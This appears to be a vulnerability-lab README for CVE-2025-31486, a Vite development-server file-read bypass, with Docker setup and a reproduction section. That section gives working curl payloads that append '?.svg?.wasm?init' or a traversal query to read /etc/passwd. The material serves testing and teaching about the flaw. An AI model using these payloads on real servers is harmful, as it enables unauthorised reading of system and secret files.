# Vite Development Server Arbitrary File Read Bypass (CVE-2025-31486)

[中文版本(Chinese version)](README.zh-cn.md)

Vite is a modern frontend build tool that provides a faster and leaner development experience for modern web projects. It consists of two major parts: a development server with Hot Module Replacement (HMR) capability, and a build command that bundles your code with Rollup.

In versions of Vite before 6.2.5, 6.1.4, 6.0.14, 5.4.17, and 4.5.12, the `server.fs.deny` feature, which is designed to restrict access to files outside of Vite's serving allow list, can be bypassed. By appending `?.svg?.wasm?init`  to URLs using the `@fs` prefix or with relative paths `/@fs/{{project_path}}/?/../../../../../../etc/passwd?import&?raw` , an attacker can read arbitrary files on the filesystem, as long as the Node.js process has permission to read them.

This vulnerability is a bypass for the patch of [CVE-2025-31125](../CVE-2025-31125/README.md).

References:

- <https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x>
- <https://nvd.nist.gov/vuln/detail/CVE-2025-31486>

## Environment Setup

Execute the following command to start a Vite 6.2.4 development server:

```
docker compose up -d
```

After the server starts, you can access the Vite development environment at `http://your-ip:5173`.

> Note: The development server of the old version of Vite defaults to port 3000, while the new version defaults to port 5173, please pay attention to the difference.

## Vulnerability Reproduction

By appending `?.svg?.wasm?init` to the URL, you can bypass this restriction and retrieve the contents of the file:

```
curl "http://your-ip:5173/@fs/etc/passwd?.svg?.wasm?init"
```

This request will return the contents of the `/etc/passwd` file:

![](1.png)

Alternatively, you can also use the `/@fs/{{project_path}}/?/../../../../../../etc/passwd?import&?raw` query parameters to achieve the same result.

In this lab environment, the project_path is `/usr/src/`. You can verify this by accessing `/@fs/etc/passwd` and checking the response:

![](2.png)

Next, send the payload:

```
curl "http://your-ip:5173/@fs/usr/src/?/../../../../../../etc/passwd?import&?raw"
```

This request will return the contents of the `/etc/passwd` file:

![](3.png)
